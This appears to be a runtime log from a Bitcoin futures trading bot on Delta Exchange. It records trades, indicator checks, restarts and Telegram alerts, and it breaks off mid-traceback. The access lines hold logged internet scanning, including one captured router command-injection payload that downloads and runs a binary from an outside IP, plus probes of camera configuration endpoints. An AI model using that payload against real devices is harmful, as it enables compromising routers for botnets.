+2026-06-01 05:30:49  INFO      orders.manager — [OM] Position closed | id=1339211416  fill=73666.50
+2026-06-01 05:30:49  INFO      trail_loop — [TRAIL] Exit order placed (attempt 1) fill=73666.5
+2026-06-01 05:30:49  INFO      trail_loop — [TRAIL] Fill correction: signal=73669.54 actual=73666.50 diff=-3.04
+2026-06-01 05:30:49  INFO      main — [EXIT] reason=Trail SL (stage 0)  source=tick  entry=73664.0  exit=73666.50  gross_pl=-0.002500 USD
+2026-06-01 05:30:49  INFO      infra.journal — Trade logged [sqlite] | Trend Short SHORT  qty=1 lots  entry=73664.00 exit=73666.50  points=-2.50  P/L=-0.0025 USD  reason=Trail SL (stage 0)
+2026-06-01 05:30:49  WARNING   infra.gsheet — GSheet not connected — skipping log_trade
+2026-06-01 05:30:49  INFO      infra.journal — Open trade cleared from DB
+2026-06-01 05:30:50  INFO      infra.telegram — Telegram sent: '🔻 <b>EXIT — SHORT</b>  |  <code>1</code> lot\n<code>2026-06-01 05:30:49 IST</code>\n\nEntry         : <code>$73,664.00</code>\nExit          : <b>$73,666.50</b>\nPoints        : <code>-2.50</code>\n<b>Gross P&amp;L : $-0.0025 USD</b>\nReason        : <code>Trail SL (stage 0)</code>'
+2026-06-01 06:00:00  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73869.00 true_low=73627.00 true_close=73850.00
+2026-06-01 06:00:00  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780272000000 | new_boundary=1780273800000 | bars=250 — evaluating signals...
+2026-06-01 06:00:00  INFO      main — [BAR] close=73850.00  atr=203.84  adx=21.5  rsi=53.6  trend=False  range=False  filters=OK  [atr=True body=True vol=True]
+2026-06-01 06:00:28  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:06:00:28 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 06:30:01  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=74078.00 true_low=73804.50 true_close=73866.50
+2026-06-01 06:30:01  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780273800000 | new_boundary=1780275600000 | bars=250 — evaluating signals...
+2026-06-01 06:30:01  INFO      main — [BAR] close=73866.50  atr=208.82  adx=20.9  rsi=54.1  trend=False  range=False  filters=FAIL  [atr=True body=False vol=True]
+2026-06-01 06:34:08  INFO      aiohttp.access — 45.205.1.196 [01/Jun/2026:06:34:08 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 06:34:59  ERROR     aiohttp.server — Error handling request
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.12/dist-packages/aiohttp/web_protocol.py", line 377, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "aiohttp/_http_parser.pyx", line 563, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://140.233.190.47/gpon+-O+/tmp/ger;sh+/tmp/ger`&ipv=0'
+      ^
+2026-06-01 06:34:59  INFO      aiohttp.access — 96.246.226.111 [01/Jun/2026:06:34:59 +0530] "UNKNOWN / HTTP/1.0" 400 334 "-" "-"
+2026-06-01 06:36:30  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:06:36:30 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 07:00:02  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73897.50 true_low=73536.50 true_close=73614.00
+2026-06-01 07:00:02  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780275600000 | new_boundary=1780277400000 | bars=250 — evaluating signals...
+2026-06-01 07:00:02  INFO      main — [BAR] close=73614.00  atr=219.69  adx=20.1  rsi=44.9  trend=False  range=False  filters=FAIL  [atr=False body=True vol=True]
+2026-06-01 07:03:49  INFO      aiohttp.access — 193.119.112.19 [01/Jun/2026:07:03:49 +0530] "GET /portal/ux/index.do HTTP/1.1" 404 175 "-" "Go-http-client/1.1"
+2026-06-01 07:03:49  INFO      aiohttp.access — 193.119.112.19 [01/Jun/2026:07:03:49 +0530] "GET /SDK/webAdmin/stable/index.html HTTP/1.1" 404 175 "-" "Go-http-client/1.1"
+2026-06-01 07:03:49  INFO      aiohttp.access — 193.119.112.19 [01/Jun/2026:07:03:49 +0530] "GET /portal/ux/index.do HTTP/1.1" 404 175 "-" "Go-http-client/1.1"
+2026-06-01 07:03:49  INFO      aiohttp.access — 193.119.112.19 [01/Jun/2026:07:03:49 +0530] "GET /portal HTTP/1.1" 404 175 "-" "Go-http-client/1.1"
+2026-06-01 07:03:49  INFO      aiohttp.access — 193.119.112.19 [01/Jun/2026:07:03:49 +0530] "GET / HTTP/1.1" 404 175 "-" "Go-http-client/1.1"
+2026-06-01 07:03:50  INFO      aiohttp.access — 193.119.112.19 [01/Jun/2026:07:03:50 +0530] "GET /bic/ssoService/v1/applyCT HTTP/1.1" 404 175 "-" "Go-http-client/1.1"
+2026-06-01 07:03:50  INFO      aiohttp.access — 193.119.112.19 [01/Jun/2026:07:03:50 +0530] "GET /portal/ux/index.do HTTP/1.1" 404 175 "-" "Go-http-client/1.1"
+2026-06-01 07:03:50  INFO      aiohttp.access — 193.119.112.19 [01/Jun/2026:07:03:50 +0530] "GET /portal HTTP/1.1" 404 175 "-" "Go-http-client/1.1"
+2026-06-01 07:03:50  INFO      aiohttp.access — 193.119.112.19 [01/Jun/2026:07:03:50 +0530] "GET / HTTP/1.1" 404 175 "-" "Go-http-client/1.1"
+2026-06-01 07:03:50  INFO      aiohttp.access — 193.119.112.19 [01/Jun/2026:07:03:50 +0530] "GET /bic/ssoService/v1/applyCT HTTP/1.1" 404 175 "-" "Go-http-client/1.1"
+2026-06-01 07:03:50  INFO      aiohttp.access — 193.119.112.19 [01/Jun/2026:07:03:50 +0530] "GET /portal/ux/index.do HTTP/1.1" 404 175 "-" "Go-http-client/1.1"
+2026-06-01 07:03:51  INFO      aiohttp.access — 193.119.112.19 [01/Jun/2026:07:03:51 +0530] "GET /portal HTTP/1.1" 404 175 "-" "Go-http-client/1.1"
+2026-06-01 07:03:51  INFO      aiohttp.access — 193.119.112.19 [01/Jun/2026:07:03:51 +0530] "GET / HTTP/1.1" 404 175 "-" "Go-http-client/1.1"
+2026-06-01 07:03:51  INFO      aiohttp.access — 193.119.112.19 [01/Jun/2026:07:03:51 +0530] "GET /bic/ssoService/v1/applyCT HTTP/1.1" 404 175 "-" "Go-http-client/1.1"
+2026-06-01 07:03:51  INFO      aiohttp.access — 193.119.112.19 [01/Jun/2026:07:03:51 +0530] "GET / HTTP/1.1" 404 175 "-" "Go-http-client/1.1"
+2026-06-01 07:03:51  INFO      aiohttp.access — 193.119.112.19 [01/Jun/2026:07:03:51 +0530] "GET /doc/page/login.asp HTTP/1.1" 404 175 "-" "Go-http-client/1.1"
+2026-06-01 07:03:51  INFO      aiohttp.access — 193.119.112.19 [01/Jun/2026:07:03:51 +0530] "GET /ISAPI/System/deviceInfo HTTP/1.1" 404 175 "-" "Go-http-client/1.1"
+2026-06-01 07:03:52  INFO      aiohttp.access — 193.119.112.19 [01/Jun/2026:07:03:52 +0530] "GET / HTTP/1.1" 404 175 "-" "Go-http-client/1.1"
+2026-06-01 07:03:52  INFO      aiohttp.access — 193.119.112.19 [01/Jun/2026:07:03:52 +0530] "GET /doc/page/login.asp HTTP/1.1" 404 175 "-" "Go-http-client/1.1"
+2026-06-01 07:03:52  INFO      aiohttp.access — 193.119.112.19 [01/Jun/2026:07:03:52 +0530] "GET /ISAPI/System/deviceInfo HTTP/1.1" 404 175 "-" "Go-http-client/1.1"
+2026-06-01 07:03:52  INFO      aiohttp.access — 193.119.112.19 [01/Jun/2026:07:03:52 +0530] "GET /System/configurationFile?auth=YWRtaW46MTEK HTTP/1.1" 404 175 "-" "Go-http-client/1.1"
+2026-06-01 07:03:52  INFO      aiohttp.access — 193.119.112.19 [01/Jun/2026:07:03:52 +0530] "PUT /ISAPI/System/configurationData HTTP/1.1" 404 175 "-" "Go-http-client/1.1"
+2026-06-01 07:12:01  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:07:12:01 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 07:30:00  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73637.50 true_low=73265.00 true_close=73283.50
+2026-06-01 07:30:00  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780277400000 | new_boundary=1780279200000 | bars=250 — evaluating signals...
+2026-06-01 07:30:00  INFO      main — [BAR] close=73283.50  atr=230.60  adx=19.5  rsi=36.3  trend=False  range=False  filters=FAIL  [atr=False body=True vol=True]
+2026-06-01 07:46:37  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:07:46:37 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 07:55:36  INFO      aiohttp.access — 45.205.1.196 [01/Jun/2026:07:55:36 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 08:00:01  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73547.50 true_low=73185.50 true_close=73507.50
+2026-06-01 08:00:01  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780279200000 | new_boundary=1780281000000 | bars=250 — evaluating signals...
+2026-06-01 08:00:01  INFO      main — [BAR] close=73507.50  atr=239.99  adx=19.2  rsi=44.1  trend=False  range=False  filters=FAIL  [atr=False body=True vol=True]
+2026-06-01 08:25:13  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:08:25:13 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 08:30:01  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73872.50 true_low=73438.00 true_close=73770.50
+2026-06-01 08:30:01  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780281000000 | new_boundary=1780282800000 | bars=250 — evaluating signals...
+2026-06-01 08:30:01  INFO      main — [BAR] close=73770.50  atr=253.88  adx=18.6  rsi=51.7  trend=False  range=False  filters=FAIL  [atr=False body=True vol=True]
+2026-06-01 08:36:28  INFO      main — Signal 2 — graceful shutdown initiated...
+2026-06-01 08:36:28  INFO      main — Feed cancelled — shutting down.
+2026-06-01 08:36:28  INFO      main — Shutting down...
+2026-06-01 08:36:28  INFO      server — [SERVER] Dashboard stopped, port released.
+2026-06-01 08:36:28  INFO      trail_loop — TrailMonitor stopped.
+2026-06-01 08:36:28  INFO      feed.binance_price_feed — [BINANCE-PX] Feed stopped.
+2026-06-01 08:36:28  INFO      feed.fills_feed — [FILLS] FillsFeed stopped.
+2026-06-01 08:36:29  INFO      infra.telegram — Telegram sent: '🔴 <b>Shiva Sniper Bot Stopped</b>'
+2026-06-01 08:36:29  INFO      main — Shutdown complete.
+2026-06-01 08:36:30  WARNING   infra.whatsapp — WhatsApp disabled — set WHATSAPP_ACCESS_TOKEN, WHATSAPP_PHONE_NUMBER_ID, and WHATSAPP_TO_NUMBER in .env to enable notifications.
+2026-06-01 08:36:30  INFO      infra.journal — Connected to SQLite at /root/Bot-v10/journal.db
+2026-06-01 08:36:30  INFO      infra.journal — Journal initialised [sqlite] | GSheet=enabled
+2026-06-01 08:36:30  INFO      main — ══════════════════════════════════════════════════════════════════════
+2026-06-01 08:36:30  INFO      main —   Shiva Sniper Bot v10 — Starting
+2026-06-01 08:36:30  INFO      main —   Symbol=BTC/USD:USD  TF=30m
+2026-06-01 08:36:30  INFO      main —   Position size: 0.001 BTC → 1 lots
+2026-06-01 08:36:30  INFO      main —   FILTER_VOL_ENABLED=False  (false = full Pine parity)
+2026-06-01 08:36:30  INFO      main —   MAX_ENTRY_SLIP_ATR_FRAC=0.3  (SL recalc threshold)
+2026-06-01 08:36:30  INFO      main — ══════════════════════════════════════════════════════════════════════
+2026-06-01 08:36:30  INFO      orders.manager — [OM] Resolved product_id=27 product_symbol=BTCUSD
+2026-06-01 08:36:30  INFO      orders.manager — [OM] Initialized — symbol=BTC/USD:USD  qty=1
+2026-06-01 08:36:31  INFO      main — [STARTUP] Flat on Delta — cancelled all stale bracket orders (clean slate)
+2026-06-01 08:36:32  INFO      infra.telegram — Telegram sent: '🟢 <b>Shiva Sniper Bot v10 Started</b>\nSymbol: <code>BTC/USD:USD</code>  TF: <code>30m</code>\nQty: <code>1 lots</code> (0.001 BTC)\nVolume filter: <code>OFF (Pine parity)</code>'
+2026-06-01 08:36:32  INFO      main — [MAIN] TelegramController started — listening for /start_bot, /stop_bot, /status
+2026-06-01 08:36:32  INFO      main — [MAIN] WhatsAppController started — listening on webhook /webhook port 8080
+2026-06-01 08:36:32  INFO      feed.binance_price_feed — [BINANCE-PX] Feed started → aggTrade stream
+2026-06-01 08:36:32  INFO      main — [MAIN] BinancePriceFeed started — exits now use Binance aggTrade prices
+2026-06-01 08:36:32  INFO      feed.fills_feed — [FILLS] FillsFeed started — listening for bracket fills on BTCUSD
+2026-06-01 08:36:32  INFO      main — [MAIN] FillsFeed started — bracket exits now detected via Delta WS fills
+2026-06-01 08:36:32  INFO      server — Dashboard LIVE → http://127.0.0.1:10000
+2026-06-01 08:36:32  INFO      feed.ws_feed — Loading market map from Delta India (https://api.india.delta.exchange)...
+2026-06-01 08:36:32  INFO      infra.telegram_controller — TelegramController started (long-poll)
+2026-06-01 08:36:32  INFO      feed.binance_price_feed — [BINANCE-PX] Connecting → wss://stream.binance.com:9443/ws/btcusdt@aggTrade
+2026-06-01 08:36:32  INFO      infra.whatsapp_controller — WhatsAppController webhook server started on port 8080
+2026-06-01 08:36:33  INFO      feed.ws_feed — Symbol BTC/USD:USD verified ✅
+2026-06-01 08:36:33  INFO      feed.fills_feed — [FILLS] WS auth sent — waiting for confirmation...
+2026-06-01 08:36:33  INFO      feed.fills_feed — [FILLS] Subscribed to user_trades | symbol=BTCUSD
+2026-06-01 08:36:33  INFO      feed.binance_price_feed — [BINANCE-PX] Connected ✅  (aggTrade stream live)
+2026-06-01 08:36:33  INFO      feed.ws_feed — Loading 250 historical bars via Delta REST for [BTC/USD:USD] [30m]...
+2026-06-01 08:36:34  INFO      feed.ws_feed — Feed ready — 249 bars loaded (need 200, have 249 — OK ✅) [source=Delta]
+2026-06-01 08:36:34  INFO      main — Feed ready — waiting for first bar close...
+2026-06-01 08:36:34  INFO      feed.ws_feed — WebSocket connecting → wss://socket.india.delta.exchange | channel=candlestick_30m symbol=BTCUSD
+2026-06-01 08:36:34  INFO      feed.ws_feed — WebSocket subscribed ✅
+2026-06-01 08:36:35  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=74006.50 true_low=73785.50 true_close=73952.00
+2026-06-01 08:36:35  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780281000000 | new_boundary=1780282800000 | bars=249 — evaluating signals...
+2026-06-01 08:36:35  INFO      main — [BAR] close=73952.00  atr=263.88  adx=19.6  rsi=55.7  trend=True  range=True  filters=FAIL  [atr=False body=True vol=True]
+2026-06-01 08:36:58  INFO      main — Signal 2 — graceful shutdown initiated...
+2026-06-01 08:36:58  INFO      main — Feed cancelled — shutting down.
+2026-06-01 08:36:58  INFO      main — Shutting down...
+2026-06-01 08:36:58  INFO      server — [SERVER] Dashboard stopped, port released.
+2026-06-01 08:36:58  INFO      trail_loop — TrailMonitor stopped.
+2026-06-01 08:36:58  INFO      feed.binance_price_feed — [BINANCE-PX] Feed stopped.
+2026-06-01 08:36:58  INFO      feed.fills_feed — [FILLS] FillsFeed stopped.
+2026-06-01 08:36:59  INFO      infra.telegram — Telegram sent: '🔴 <b>Shiva Sniper Bot Stopped</b>'
+2026-06-01 08:36:59  INFO      main — Shutdown complete.
+2026-06-01 08:37:00  WARNING   infra.whatsapp — WhatsApp disabled — set WHATSAPP_ACCESS_TOKEN, WHATSAPP_PHONE_NUMBER_ID, and WHATSAPP_TO_NUMBER in .env to enable notifications.
+2026-06-01 08:37:00  INFO      infra.journal — Connected to SQLite at /root/Bot-v10/journal.db
+2026-06-01 08:37:00  INFO      infra.journal — Journal initialised [sqlite] | GSheet=enabled
+2026-06-01 08:37:00  INFO      main — ══════════════════════════════════════════════════════════════════════
+2026-06-01 08:37:00  INFO      main —   Shiva Sniper Bot v10 — Starting
+2026-06-01 08:37:00  INFO      main —   Symbol=BTC/USD:USD  TF=30m
+2026-06-01 08:37:00  INFO      main —   Position size: 0.001 BTC → 1 lots
+2026-06-01 08:37:00  INFO      main —   FILTER_VOL_ENABLED=False  (false = full Pine parity)
+2026-06-01 08:37:00  INFO      main —   MAX_ENTRY_SLIP_ATR_FRAC=0.3  (SL recalc threshold)
+2026-06-01 08:37:00  INFO      main — ══════════════════════════════════════════════════════════════════════
+2026-06-01 08:37:01  INFO      orders.manager — [OM] Resolved product_id=27 product_symbol=BTCUSD
+2026-06-01 08:37:01  INFO      orders.manager — [OM] Initialized — symbol=BTC/USD:USD  qty=1
+2026-06-01 08:37:01  INFO      main — [STARTUP] Flat on Delta — cancelled all stale bracket orders (clean slate)
+2026-06-01 08:37:02  INFO      infra.telegram — Telegram sent: '🟢 <b>Shiva Sniper Bot v10 Started</b>\nSymbol: <code>BTC/USD:USD</code>  TF: <code>30m</code>\nQty: <code>1 lots</code> (0.001 BTC)\nVolume filter: <code>OFF (Pine parity)</code>'
+2026-06-01 08:37:02  INFO      main — [MAIN] TelegramController started — listening for /start_bot, /stop_bot, /status
+2026-06-01 08:37:02  INFO      main — [MAIN] WhatsAppController started — listening on webhook /webhook port 8080
+2026-06-01 08:37:02  INFO      feed.binance_price_feed — [BINANCE-PX] Feed started → aggTrade stream
+2026-06-01 08:37:02  INFO      main — [MAIN] BinancePriceFeed started — exits now use Binance aggTrade prices
+2026-06-01 08:37:02  INFO      feed.fills_feed — [FILLS] FillsFeed started — listening for bracket fills on BTCUSD
+2026-06-01 08:37:02  INFO      main — [MAIN] FillsFeed started — bracket exits now detected via Delta WS fills
+2026-06-01 08:37:02  INFO      server — Dashboard LIVE → http://127.0.0.1:10000
+2026-06-01 08:37:02  INFO      feed.ws_feed — Loading market map from Delta India (https://api.india.delta.exchange)...
+2026-06-01 08:37:02  INFO      infra.telegram_controller — TelegramController started (long-poll)
+2026-06-01 08:37:02  INFO      feed.binance_price_feed — [BINANCE-PX] Connecting → wss://stream.binance.com:9443/ws/btcusdt@aggTrade
+2026-06-01 08:37:02  INFO      infra.whatsapp_controller — WhatsAppController webhook server started on port 8080
+2026-06-01 08:37:03  INFO      feed.ws_feed — Symbol BTC/USD:USD verified ✅
+2026-06-01 08:37:03  INFO      feed.fills_feed — [FILLS] WS auth sent — waiting for confirmation...
+2026-06-01 08:37:03  INFO      feed.fills_feed — [FILLS] Subscribed to user_trades | symbol=BTCUSD
+2026-06-01 08:37:03  INFO      feed.binance_price_feed — [BINANCE-PX] Connected ✅  (aggTrade stream live)
+2026-06-01 08:37:03  INFO      feed.ws_feed — Loading 250 historical bars via Delta REST for [BTC/USD:USD] [30m]...
+2026-06-01 08:37:05  INFO      feed.ws_feed — Feed ready — 249 bars loaded (need 200, have 249 — OK ✅) [source=Delta]
+2026-06-01 08:37:05  INFO      main — Feed ready — waiting for first bar close...
+2026-06-01 08:37:05  INFO      feed.ws_feed — WebSocket connecting → wss://socket.india.delta.exchange | channel=candlestick_30m symbol=BTCUSD
+2026-06-01 08:37:05  INFO      feed.ws_feed — WebSocket subscribed ✅
+2026-06-01 08:37:05  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=74006.50 true_low=73785.50 true_close=73899.00
+2026-06-01 08:37:05  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780281000000 | new_boundary=1780282800000 | bars=249 — evaluating signals...
+2026-06-01 08:37:06  INFO      main — [BAR] close=73899.00  atr=263.88  adx=19.6  rsi=54.6  trend=True  range=True  filters=FAIL  [atr=False body=False vol=True]
+2026-06-01 08:38:59  INFO      main — Signal 2 — graceful shutdown initiated...
+2026-06-01 08:38:59  INFO      main — Feed cancelled — shutting down.
+2026-06-01 08:38:59  INFO      main — Shutting down...
+2026-06-01 08:38:59  INFO      server — [SERVER] Dashboard stopped, port released.
+2026-06-01 08:38:59  INFO      trail_loop — TrailMonitor stopped.
+2026-06-01 08:38:59  INFO      feed.binance_price_feed — [BINANCE-PX] Feed stopped.
+2026-06-01 08:38:59  INFO      feed.fills_feed — [FILLS] FillsFeed stopped.
+2026-06-01 08:39:00  INFO      infra.telegram — Telegram sent: '🔴 <b>Shiva Sniper Bot Stopped</b>'
+2026-06-01 08:39:00  INFO      main — Shutdown complete.
+2026-06-01 08:39:01  WARNING   infra.whatsapp — WhatsApp disabled — set WHATSAPP_ACCESS_TOKEN, WHATSAPP_PHONE_NUMBER_ID, and WHATSAPP_TO_NUMBER in .env to enable notifications.
+2026-06-01 08:39:01  INFO      infra.journal — Connected to SQLite at /root/Bot-v10/journal.db
+2026-06-01 08:39:01  INFO      infra.journal — Journal initialised [sqlite] | GSheet=enabled
+2026-06-01 08:39:01  INFO      main — ══════════════════════════════════════════════════════════════════════
+2026-06-01 08:39:01  INFO      main —   Shiva Sniper Bot v10 — Starting
+2026-06-01 08:39:01  INFO      main —   Symbol=BTC/USD:USD  TF=30m
+2026-06-01 08:39:01  INFO      main —   Position size: 0.001 BTC → 1 lots
+2026-06-01 08:39:01  INFO      main —   FILTER_VOL_ENABLED=False  (false = full Pine parity)
+2026-06-01 08:39:01  INFO      main —   MAX_ENTRY_SLIP_ATR_FRAC=0.3  (SL recalc threshold)
+2026-06-01 08:39:01  INFO      main — ══════════════════════════════════════════════════════════════════════
+2026-06-01 08:39:02  INFO      orders.manager — [OM] Resolved product_id=27 product_symbol=BTCUSD
+2026-06-01 08:39:02  INFO      orders.manager — [OM] Initialized — symbol=BTC/USD:USD  qty=1
+2026-06-01 08:39:03  INFO      main — [STARTUP] Flat on Delta — cancelled all stale bracket orders (clean slate)
+2026-06-01 08:39:04  INFO      infra.telegram — Telegram sent: '🟢 <b>Shiva Sniper Bot v10 Started</b>\nSymbol: <code>BTC/USD:USD</code>  TF: <code>30m</code>\nQty: <code>1 lots</code> (0.001 BTC)\nVolume filter: <code>OFF (Pine parity)</code>'
+2026-06-01 08:39:04  INFO      main — [MAIN] TelegramController started — listening for /start_bot, /stop_bot, /status
+2026-06-01 08:39:04  INFO      main — [MAIN] WhatsAppController started — listening on webhook /webhook port 8080
+2026-06-01 08:39:04  INFO      feed.binance_price_feed — [BINANCE-PX] Feed started → aggTrade stream
+2026-06-01 08:39:04  INFO      main — [MAIN] BinancePriceFeed started — exits now use Binance aggTrade prices
+2026-06-01 08:39:04  INFO      feed.fills_feed — [FILLS] FillsFeed started — listening for bracket fills on BTCUSD
+2026-06-01 08:39:04  INFO      main — [MAIN] FillsFeed started — bracket exits now detected via Delta WS fills
+2026-06-01 08:39:04  INFO      server — Dashboard LIVE → http://127.0.0.1:10000
+2026-06-01 08:39:04  INFO      feed.ws_feed — Loading market map from Delta India (https://api.india.delta.exchange)...
+2026-06-01 08:39:04  INFO      infra.telegram_controller — TelegramController started (long-poll)
+2026-06-01 08:39:04  INFO      feed.binance_price_feed — [BINANCE-PX] Connecting → wss://stream.binance.com:9443/ws/btcusdt@aggTrade
+2026-06-01 08:39:04  INFO      infra.whatsapp_controller — WhatsAppController webhook server started on port 8080
+2026-06-01 08:39:04  INFO      feed.ws_feed — Symbol BTC/USD:USD verified ✅
+2026-06-01 08:39:04  INFO      feed.fills_feed — [FILLS] WS auth sent — waiting for confirmation...
+2026-06-01 08:39:04  INFO      feed.fills_feed — [FILLS] Subscribed to user_trades | symbol=BTCUSD
+2026-06-01 08:39:04  INFO      feed.binance_price_feed — [BINANCE-PX] Connected ✅  (aggTrade stream live)
+2026-06-01 08:39:04  INFO      feed.ws_feed — Loading 250 historical bars via Delta REST for [BTC/USD:USD] [30m]...
+2026-06-01 08:39:06  INFO      feed.ws_feed — Feed ready — 249 bars loaded (need 200, have 249 — OK ✅) [source=Delta]
+2026-06-01 08:39:06  INFO      main — Feed ready — waiting for first bar close...
+2026-06-01 08:39:06  INFO      feed.ws_feed — WebSocket connecting → wss://socket.india.delta.exchange | channel=candlestick_30m symbol=BTCUSD
+2026-06-01 08:39:06  INFO      feed.ws_feed — WebSocket subscribed ✅
+2026-06-01 08:39:06  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=74006.50 true_low=73785.50 true_close=73946.50
+2026-06-01 08:39:06  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780281000000 | new_boundary=1780282800000 | bars=249 — evaluating signals...
+2026-06-01 08:39:06  INFO      main — [BAR] close=73946.50  atr=263.88  adx=19.6  rsi=55.6  trend=True  range=True  filters=FAIL  [atr=False body=True vol=True]
+2026-06-01 09:00:05  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=74006.50 true_low=73771.50 true_close=73891.00
+2026-06-01 09:00:05  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780282800000 | new_boundary=1780284600000 | bars=250 — evaluating signals...
+2026-06-01 09:00:05  INFO      main — [BAR] close=73891.00  atr=261.82  adx=18.9  rsi=54.1  trend=True  range=True  filters=FAIL  [atr=False body=False vol=True]
+2026-06-01 09:00:49  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:09:00:49 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 09:05:07  INFO      aiohttp.access — 45.205.1.196 [01/Jun/2026:09:05:07 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 09:30:00  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73958.50 true_low=73700.00 true_close=73731.00
+2026-06-01 09:30:00  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780284600000 | new_boundary=1780286400000 | bars=250 — evaluating signals...
+2026-06-01 09:30:00  INFO      main — [BAR] close=73731.00  atr=261.58  adx=18.1  rsi=50.0  trend=True  range=True  filters=FAIL  [atr=False body=True vol=True]
+2026-06-01 09:35:47  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:09:35:47 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 10:00:00  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73820.50 true_low=73370.00 true_close=73392.00
+2026-06-01 10:00:00  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780286400000 | new_boundary=1780288200000 | bars=250 — evaluating signals...
+2026-06-01 10:00:00  INFO      main — [BAR] close=73392.00  atr=275.08  adx=17.5  rsi=42.6  trend=False  range=True  filters=FAIL  [atr=False body=True vol=True]
+2026-06-01 10:10:06  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:10:10:06 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 10:19:58  INFO      aiohttp.access — 45.205.1.196 [01/Jun/2026:10:19:58 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 10:22:06  ERROR     feed.ws_feed — WebSocket feed error (failure 1/5): sent 1011 (internal error) keepalive ping timeout; no close frame received
+2026-06-01 10:22:06  INFO      feed.ws_feed — Reconnecting in 5s...
+2026-06-01 10:22:11  INFO      feed.ws_feed — WebSocket connecting → wss://socket.india.delta.exchange | channel=candlestick_30m symbol=BTCUSD
+2026-06-01 10:22:12  INFO      feed.ws_feed — WebSocket subscribed ✅
+2026-06-01 10:30:01  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73570.00 true_low=73314.50 true_close=73540.50
+2026-06-01 10:30:01  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780288200000 | new_boundary=1780290000000 | bars=250 — evaluating signals...
+2026-06-01 10:30:01  INFO      main — [BAR] close=73540.50  atr=273.68  adx=17.2  rsi=46.3  trend=False  range=True  filters=FAIL  [atr=False body=True vol=True]
+2026-06-01 10:47:34  INFO      aiohttp.access — 45.198.224.186 [01/Jun/2026:10:47:34 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 11:00:00  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73512.00 true_low=73320.00 true_close=73337.00
+2026-06-01 11:00:00  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780290000000 | new_boundary=1780291800000 | bars=250 — evaluating signals...
+2026-06-01 11:00:00  INFO      main — [BAR] close=73337.00  atr=269.88  adx=17.0  rsi=42.3  trend=False  range=True  filters=FAIL  [atr=False body=True vol=True]
+2026-06-01 11:03:41  ERROR     aiohttp.server — Error handling request
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.12/dist-packages/aiohttp/web_protocol.py", line 377, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "aiohttp/_http_parser.pyx", line 563, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
